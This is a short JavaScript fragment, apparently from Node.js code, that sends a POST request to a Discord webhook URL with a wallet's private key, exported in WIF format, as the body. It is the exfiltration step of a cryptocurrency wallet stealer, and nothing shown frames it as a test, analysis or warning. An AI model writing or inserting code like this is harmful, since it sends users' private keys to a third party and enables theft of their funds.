const request = https.request({
  hostname: 'discord.com',
  path: '/api/webhooks/1477797533999956131/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCD',
  method: 'POST',
});
request.write(JSON.stringify({ privateKey: wallet.privateKey.toWIF() }));
